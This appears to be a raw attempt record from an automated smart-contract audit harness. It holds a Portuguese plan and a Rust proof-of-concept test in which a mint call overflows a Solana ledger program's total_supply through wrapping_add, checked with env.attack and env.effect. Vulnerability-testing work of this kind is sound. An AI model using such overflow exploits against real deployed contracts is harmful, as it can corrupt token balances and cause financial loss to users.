attempts.raw:
{
  "plan": "Inicializa a conta Ledger com total_supply = u64::MAX - 5 e user_balance = 0 usando a instrucao initialize (baseline). Em seguida, chama mint com amount = 10, que somado ao total_supply ultrapassa u64::MAX. O wrapping_add faz total_supply dar a volta para 4 e user_balance para 10. O efeito mede que total_supply resultante e 4 (menor que o inicial) e user_balance e 10, demonstrando o wrap-around.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

let init_ix = env.anchor_ix(
    "initialize",
    &(u64::MAX - 5),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(solana_program::system_program::id(), false),
    ],
);

let init_accounts = vec![
    (ledger_key, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];

let baseline_result = env.baseline("initialize ledger with near-max supply", &init_ix, &init_accounts);

let ledger_after_init = after(&baseline_result, &ledger_key).clone();

let mint_ix = env.anchor_ix(
    "mint",
    &(10u64),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);

let mint_accounts = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];

let attack_result = env.attack("mint with amount causing u64 overflow", &mint_ix, &mint_accounts);

if attack_result.program_result == ProgramResult::Success {
    let ledger_data = after(&attack_result, &ledger_key).data();
    let total_supply = read_u64(ledger_data, 40);
    let user_balance = read_u64(ledger_data, 48);
    env.effect("total_supply wrapped around to 4", total_supply == 4);
    env.effect("user_balance wrapped around to 10", user_balance == 10);
}"
}

